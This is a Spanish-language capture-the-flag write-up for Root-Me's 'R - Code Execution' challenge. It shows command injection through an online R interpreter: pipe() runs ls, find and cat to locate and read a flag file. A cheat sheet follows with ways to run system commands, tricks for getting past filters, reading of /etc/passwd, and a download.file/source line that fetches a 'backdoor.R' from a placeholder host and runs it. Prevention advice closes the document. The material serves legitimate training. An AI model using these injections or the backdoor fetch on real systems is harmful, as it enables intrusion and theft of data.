Writeup: R - Code Execution (Root-Me)

📋 Información del Reto
Campo	Valor
Nombre	R - Code Execution
Plataforma	Root-Me
Categoría	App - Script
Puntos	20
Dificultad	1/5
Estado	✅ Completado

📖 Enunciado

    "Se acercan tus exámenes de Análisis Estadístico en R. Tu profesor ha puesto a tu disposición un intérprete de R en la ENT de la universidad para que puedas practicar. Como no tienes tiempo para repasar, decides robar los exámenes."

El reto consiste en explotar un intérprete de R en línea que permite ejecutar código de forma interactiva. El objetivo es encontrar y leer el archivo que contiene la flag (los "exámenes" del profesor).

🧠 Estrategia General

El reto se basa en una vulnerabilidad de Command Injection. R tiene funciones que permiten ejecutar comandos del sistema operativo directamente. Nuestro objetivo será:

    Enumerar el sistema de archivos para encontrar la flag

    Leer el archivo que contiene la flag

🔍 Fase 1: Exploración Inicial
Comprobación de ejecución de comandos

Primero verificamos si podemos ejecutar comandos del sistema:
r

readLines(pipe("ls -la"))

Salida:
text

[1] "total 20"
[2] "drwxrwxr-x 1 root root 4096 Jul 13 2024 ."
[3] "drwxr-xr-x 1 root root 4096 Nov 21 2023 .."
[4] "drwxr-xr-x 1 root www-data 4096 Jul 13 2024 assets"
[5] "-rwxr-xr-x 1 root www-data 5662 Jul 20 2023 index.php"

✅ Confirmado: Podemos ejecutar comandos del sistema mediante pipe() y readLines().

El directorio actual contiene:

    assets/ → Directorio con recursos estáticos

    index.php → Archivo PHP que probablemente sirve el intérprete

Exploración del directorio assets/
r

readLines(pipe("ls -la assets/"))

Salida:
text

[1] "total 268"
[2] "drwxr-xr-x 1 root www-data 4096 Jul 13 2024 ."
[3] "drwxrwxr-x 1 root root 4096 Jul 13 2024 .."
[4] "-rwxr-xr-x 1 root www-data 6876 Apr 19 2021 R-console.js"
[5] "-rwxr-xr-x 1 root www-data 111290 Apr 5 2022 R_logo.png"
[6] "drwxr-sr-x 1 root www-data 4096 May 1 2021 ace"
[7] "-rwxr-xr-x 1 root www-data 32701 Nov 23 2018 fork-awesome.min.css"
[8] "-rwxr-xr-x 1 root www-data 92629 Apr 19 2021 jquery-1.9.1.min.js"
[9] "-rwxr-xr-x 1 root www-data 673 Apr 19 2021 loader.gif"
[10] "-rwxr-xr-x 1 root www-data 4610 Apr 19 2021 styles.css"

Nada interesante aquí, solo archivos de frontend.
🔎 Fase 2: Búsqueda de la Flag
Búsqueda recursiva con find
r

readLines(pipe("find / -name '*flag*' 2>/dev/null"))

Salida (truncada):
text

[1] "/proc/sys/kernel/acpi_video_flags"
...
[64] "/sys/module/scsi_mod/parameters/default_dev_flags"
[65] "/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt"

🎯 ¡Encontrado! La ruta de la flag es:
text

/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt

    Nota: Ejecutamos find con 2>/dev/null para redirigir los errores (permisos denegados) y obtener una salida más limpia.

Verificación con búsqueda de .txt
r

readLines(pipe("find / -name '*.txt' 2>/dev/null | grep -i flag"))

Salida:
text

[1] "/home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt"

✅ Confirmamos la ubicación.
📄 Fase 3: Lectura de la Flag
r

readLines(pipe("cat /home/prof-stats/corriges_examens_analyses_stats/2021/flag.txt"))

Salida:
text

[1] "******************************"

¡Flag obtenida! 🎉
📊 Tabla de Comandos R Útiles

Comandos para Ejecución de Sistema

Comando R			Descripción									Ejemplo	Salida Esperada
readLines(pipe("comando"))	Ejecuta comando y lee su salida línea por línea	readLines(pipe("ls -la"))	Listado detallado de archivos
system("comando")		Ejecuta comando (retorna código de salida)					system("whoami")	0 (éxito) o código de error
system("comando", intern=TRUE)	Ejecuta comando y captura la salida como vector	system("id", intern=TRUE)	"uid=33(www-data)..."
system2("cmd", args="-la")	Alternativa con argumentos separados						system2("ls", args="-la")	Igual que system()
pipe("comando")			Abre un pipe para leer/salida de un comando					readLines(pipe("pwd"))	/var/www/html
shell("comando")		Ejecuta comando (Linux redirige a system())					shell("ls")	Listado de archivos

Comandos para Manipulación de Archivos

Comando R			Descripción								Ejemplo	Uso Práctico
readLines("archivo")		Lee un archivo directamente (sin comandos)				readLines("/etc/passwd")	Leer archivos de configuración
writeLines(texto, "archivo")	Escribe texto en un archivo						writeLines("test", "/tmp/test.txt")	Crear archivos para pruebas
file.exists("archivo")		Verifica si un archivo existe						file.exists("/flag.txt")	Comprobar existencia
file.info("archivo")		Obtiene metadatos de un archivo						file.info("/etc/passwd")	Ver permisos, tamaño, fechas
list.files()			Lista archivos en un directorio	list.files("/", full.names=TRUE)	Alternativa a ls
dir.exists("directorio")	Verifica si un directorio existe					dir.exists("/home")	Comprobar directorios
unlink("archivo")		Elimina un archivo							unlink("/tmp/test.txt")	Borrar archivos
file.copy("origen", "destino")	Copia un archivo							file.copy("/flag.txt", "/tmp/")	Copiar archivos
file.rename("viejo", "nuevo")	Renombra o mueve un archivo						file.rename("/flag.txt", "/tmp/flag.txt")	Mover archivos

Comandos para Directorios y Rutas

Comando R		Descripción					Ejemplo	Uso Práctico
getwd()			Obtiene el directorio de trabajo actual		getwd()	Saber dónde estamos
setwd("ruta")		Cambia el directorio de trabajo			setwd("/home")	Navegar por el sistema
dirname("ruta")		Obtiene el directorio padre de una ruta		dirname("/home/user/file.txt")	Extraer ruta padre
basename("ruta")	Obtiene el nombre del archivo/directorio	basename("/home/user/file.txt")	Extraer nombre de archivo
path.expand("~")	Expande rutas con ~				path.expand("~/.bashrc")	Resolver rutas de usuario
normalizePath("ruta")	Normaliza una ruta (resuelve .., .)		normalizePath("../")	Obtener ruta absoluta

Comandos para Información del Sistema

Comando R			Descripción				Ejemplo	Uso Práctico
Sys.info()			Información del sistema operativo	Sys.info()	Saber SO, arquitectura
Sys.getenv("VAR")		Obtiene una variable de entorno		Sys.getenv("PATH")	Ver variables de entorno
Sys.setenv("VAR=valor")		Establece una variable de entorno	Sys.setenv("FLAG=123")	Modificar entorno
Sys.which("comando")		Encuentra la ruta de un comando		Sys.which("python3")	Localizar binarios
Sys.time()			Fecha y hora actual			Sys.time()	Obtener timestamp
Sys.sleep(segundos)		Pausa la ejecución			Sys.sleep(5)	Esperar para pruebas
sessionInfo()			Información de la sesión de R		sessionInfo()	Versiones de paquetes
R.version			Versión de R				R.version$version.string	Saber versión exacta

Comandos para Manipulación de Texto y Salida

Comando R				Descripción			Ejemplo	Uso Práctico
paste(..., sep="")			Concatena strings		paste("sy", "stem", sep="")	Ofuscar comandos
paste0(...)				Concatena sin separador		paste0("sy", "stem")	Lo mismo que arriba
grep("patrón", vector)			Busca patrones en texto		grep("flag", salida)	Filtrar resultados
grepl("patrón", texto)			Devuelve TRUE/FALSE		grepl("root", readLines("/etc/passwd"))	Verificar existencia
sub("patrón", "reemplazo", texto)	Reemplaza texto			sub("ls", "cat", "ls -la")	Modificar comandos
gsub("patrón", "reemplazo", texto)	Reemplaza todas las ocurrencias	gsub(" ", "", "hola mundo")	Eliminar espacios
strsplit(texto, " ")			Divide texto en partes		strsplit("ls -la", " ")[[1]]	Parsear comandos
sprintf("formato", args)		Formatea strings		sprintf("cat %s", archivo)	Construir comandos dinámicos
cat(...)				Imprime texto (sin comillas)	cat("Hola\n")	Mostrar salida sin formato R

Comandos de Ofuscación (para evadir filtros)

Técnica			Descripción			Ejemplo
paste0()		Ofuscar palabras clave		paste0("s", "y", "stem")
eval(parse(text=...))	Evaluar código dinámico		eval(parse(text="system('ls')"))
get("system")()		Obtener función por nombre	get("system")("ls")
do.call()		Llamar función con argumentos	do.call("system", list("ls"))
sprintf()		Construir comandos dinámicos	sprintf("%s -la", "ls")
chartr()		Transformar caracteres		chartr("abc", "xyz", "sys")
substr()		Extraer partes de strings	substr("ls -la", 1, 2)
rev()			Invertir strings		rev(strsplit("metsys", "")[[1]])

Comandos Especiales para CTF

Comando R			Descripción				Ejemplo	Uso en CTF
download.file(url, dest)	Descarga archivos			download.file("http://IP/backdoor.R", "/tmp/backdoor.R")	Subir herramientas
source("archivo.R")		Ejecuta un script de R			source("/tmp/backdoor.R")	Cargar código externo
library(paquete)		Carga un paquete			library("httr")	Usar paquetes para HTTP
installed.packages()		Lista paquetes instalados		installed.packages()	Descubrir herramientas disponibles
rawToChar()			Convierte bytes a texto			rawToChar(as.raw(c(0x66,0x6c,0x61,0x67)))	Manejar datos binarios
charToRaw()			Convierte texto a bytes			charToRaw("flag")	Codificar para evadir filtros
iconv()				Convierte codificaciones		iconv("flag", from="ASCII", to="UTF-8")	Cambiar formato de texto

Comandos para Reconocimiento Avanzado

Comando R		Descripción			Ejemplo	Uso Práctico
tryCatch()		Manejo de errores		tryCatch(readLines("/root/flag"), error=function(e) "No acceso")	Manejar errores sin detener ejecución
suppressWarnings()	Oculta advertencias		suppressWarnings(readLines(pipe("find / 2>/dev/null")))	Salida más limpia
options(warn=-1)	Desactiva advertencias		options(warn=-1)	Evitar ruido
system.time()		Mide tiempo de ejecución	system.time(system("find / -name flag"))	Verificar si algo está tardando mucho
memory.limit()		Límite de memoria (Windows)	memory.limit(4000)	Gestionar recursos

Ejemplos de Encadenamiento (Pipes en R)
r

# Encadenar comandos del sistema
readLines(pipe("find / -name '*flag*' 2>/dev/null | head -n 5"))

# Guardar salida en variable
salida <- system("ls -la", intern=TRUE)
salida[grep("flag", salida)]

# Buscar y leer en un solo paso
archivo <- system("find / -name flag.txt 2>/dev/null", intern=TRUE)[1]
if (!is.na(archivo)) readLines(pipe(paste("cat", archivo)))

# Ejecución condicional
system("which python3 > /dev/null && echo 'Python existe' || echo 'No existe'")

🛡️ Lecciones de Seguridad
Vulnerabilidad: Command Injection

Este reto explota una vulnerabilidad donde un intérprete de R permite la ejecución de comandos del sistema sin restricciones.

¿Cómo se pudo prevenir?

    Deshabilitar funciones peligrosas: system(), system2(), pipe(), shell()

    Sanitizar entradas: Filtrar caracteres especiales como ;, |, &, $, (, )

    Usar un sandbox: Chroot, contenedores, o AppArmor

    Lista blanca de comandos: Permitir solo comandos específicos y seguros

    Ejecutar con privilegios mínimos: Usar un usuario sin permisos de lectura en directorios sensibles

📈 Comandos Según Categoría de Uso

Categoría			Comandos R
Ejecución de comandos		system(), system2(), pipe(), shell()
Lectura de archivos		readLines(), scan(), read.csv(), read.table()
Escritura de archivos		writeLines(), write.csv(), saveRDS()
Información de archivos		file.info(), file.exists(), file.size(), file.mtime()
Gestión de directorios		getwd(), setwd(), list.files(), dir.create()
Manipulación de texto		paste(), grep(), sub(), gsub(), strsplit()
Ofuscación			paste0(), eval(parse()), get(), do.call()
Red				download.file(), url(), curl::curl_fetch_memory()

🏁 Conclusión

El reto se resolvió exitosamente mediante:

    Identificación de la función pipe() como vector de ejecución de comandos

    Enumeración del sistema de archivos con ls -la y find

    Localización del archivo flag.txt en /home/prof-stats/corriges_examens_analyses_stats/2021/

    Extracción de la flag con cat

Flag obtenida: ******************************

💡 Consejos para Futuros Retos

    Siempre prueba pipe() primero si system() no muestra salida

    Usa 2>/dev/null para eliminar errores y tener salida limpia

    Encadena comandos con | para filtrar resultados

    Explora directorios comunes: /, /home, /var/www, /opt, /root

    Busca por extensiones: .txt, .flag, .key, .secret

    Si un comando está bloqueado, prueba con ofuscación

    Revisa variables de entorno con env (a veces la flag está ahí)
